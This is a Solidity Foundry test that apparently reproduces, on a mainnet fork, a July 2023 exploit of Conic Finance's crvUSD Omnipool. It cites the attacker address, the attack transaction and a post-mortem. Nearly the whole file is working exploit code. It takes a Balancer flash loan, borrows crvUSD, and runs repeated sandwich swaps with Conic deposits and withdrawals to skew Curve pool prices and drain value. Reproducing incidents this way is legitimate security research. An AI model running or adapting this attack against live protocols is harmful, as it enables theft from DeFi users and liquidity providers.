// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~934K USD$
// Attacker : https://etherscan.io/address/0xb6369f59fc24117b16742c9dfe064894d03b3b80
// Attack Contract : https://etherscan.io/address/0x486cb3f61771ed5483691dd65f4186da9e37c68e
// Vulnerable Contract : https://etherscan.io/address/0x369cbc5c6f139b1132d3b91b87241b37fc5b971f
// Attack Tx : https://etherscan.io/tx/0x37acd17a80a5f95728459bfea85cb2e1f64b4c75cf4a4c8dcb61964e26860882

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x369cbc5c6f139b1132d3b91b87241b37fc5b971f#code

// @Analysis
// Post-mortem : https://medium.com/@ConicFinance/post-mortem-eth-and-crvusd-omnipool-exploits-c9c7fa213a3d
// Twitter Guy : https://twitter.com/spreekaway/status/1682467603518726144

interface IConicPool {
    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);

    function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);
}

interface IcrvUSDController {
    function create_loan(uint256 collateral, uint256 debt, uint256 N) external payable;

    function repay(uint256 _d_debt, address _for, int256 max_active_band, bool use_eth) external;
}

contract ContractTest is Test {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 cncCRVUSD = IERC20(0xB569bD86ba2429fd2D8D288b40f17EBe1d0f478f);
    IConicPool ConicPool = IConicPool(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f);
    IcrvUSDController crvUSDController = IcrvUSDController(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635);
    ICurvePool crvUSD_USDT_Pool = ICurvePool(0x390f3595bCa2Df7d23783dFd126427CCeb997BF4);
    ICurvePool crvUSD_USDC_Pool = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function setUp() public {
        vm.createSelectFork("mainnet", 17_743_470);
        vm.label(address(USDT), "USDT");
        vm.label(address(USDC), "USDC");
        vm.label(address(crvUSD), "crvUSD");
        vm.label(address(cncCRVUSD), "cncCRVUSD");
        vm.label(address(ConicPool), "ConicPool");
        vm.label(address(crvUSDController), "crvUSDController");
        vm.label(address(crvUSD_USDT_Pool), "crvUSD_USDT_Pool");
        vm.label(address(crvUSD_USDC_Pool), "crvUSD_USDC_Pool");
        vm.label(address(Balancer), "Balancer");
    }

    function testExploit() external {
        USDC.approve(address(crvUSD_USDC_Pool), type(uint256).max);
        address(USDT).call(
            abi.encodeWithSignature("approve(address,uint256)", address(crvUSD_USDT_Pool), type(uint256).max)
        );
        WETH.approve(address(crvUSDController), type(uint256).max);
        crvUSD.approve(address(crvUSDController), type(uint256).max);
        crvUSD.approve(address(crvUSD_USDC_Pool), type(uint256).max);
        crvUSD.approve(address(crvUSD_USDT_Pool), type(uint256).max);
        crvUSD.approve(address(ConicPool), type(uint256).max);

        address[] memory tokens = new address[](3);
        tokens[0] = address(USDC);
        tokens[1] = address(WETH);
        tokens[2] = address(USDT);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 12_000_000 * 1e6;
        amounts[1] = 80_000 ether;
        amounts[2] = 9_000_000 * 1e6;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker crvUSD balance after exploit", crvUSD.balanceOf(address(this)), crvUSD.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        crvUSDController.create_loan(80_000 ether, 93_000_000 ether, 10); // deposit WETH, borrow crvUSD

        crvUSDToUSDCAndUSDT(19_000_000 ether, 27_000_000 ether); // swap crvUSD to USDT and USDC, crvUSD price reduction
        ConicPool.deposit(crvUSD.balanceOf(address(this)), 0, false); // deposit crvUSD to ConicPool, add crvUSD to crvUSD_USDT_Pool and crvUSD_USDC_Pool, crvUSD prices reduced further
        USDCAndUSDTTocrvUSD(USDC.balanceOf(address(this)), USDT.balanceOf(address(this))); // swap USDC and USDT to crvUSD, crvUSD prices increased, earn more crvUSD
        ConicPool.withdraw(cncCRVUSD.balanceOf(address(this)), 0); // withdraw cncCRVUSD from ConicPool, remove crvUSD from crvUSD_USDT_Pool and crvUSD_USDC_Pool, crvUSD prices increased

        sandWich();
        sandWich();
        sandWich();

        crvUSD_USDT_Pool.exchange(1, 0, 9_000_000 ether, 0); // swap crvUSD to USDT
        crvUSD_USDC_Pool.exchange(1, 0, 12_000_000 ether, 0); // swap crvUSD to USDC
        USDC.transfer(address(Balancer), amounts[0] + feeAmounts[0]);
        address(USDT).call(
            abi.encodeWithSignature("transfer(address,uint256)", address(Balancer), amounts[2] + feeAmounts[2])
        );

        crvUSD_USDT_Pool.exchange(0, 1, USDT.balanceOf(address(this)), 0); // swap USDT to crvUSD
        crvUSD_USDC_Pool.exchange(0, 1, USDC.balanceOf(address(this)), 0); // swap USDC to crvUSD
        crvUSDController.repay(93_000_000 ether, address(this), int256(2 ** 255 - 1), false);
        WETH.transfer(address(Balancer), amounts[1]);
    }

    function crvUSDToUSDCAndUSDT(uint256 swapAmount1, uint256 swapAmount2) internal {
        crvUSD_USDT_Pool.exchange(1, 0, swapAmount1, 0); // swap crvUSD to USDT
        crvUSD_USDC_Pool.exchange(1, 0, swapAmount2, 0); // swap crvUSD to USDC
    }

    function USDCAndUSDTTocrvUSD(uint256 swapAmount1, uint256 swapAmount2) internal {
        crvUSD_USDC_Pool.exchange(0, 1, swapAmount1, 0); // swap USDT to crvUSD
        crvUSD_USDT_Pool.exchange(0, 1, swapAmount2, 0); // swap USDC to crvUSD
    }

    function sandWich() internal {
        crvUSDToUSDCAndUSDT(28_000_000 ether, 39_000_000 ether);
        ConicPool.deposit(crvUSD.balanceOf(address(this)), 0, false);
        USDCAndUSDTTocrvUSD(USDC.balanceOf(address(this)), USDT.balanceOf(address(this)));
        ConicPool.withdraw(cncCRVUSD.balanceOf(address(this)), 0);
    }
}
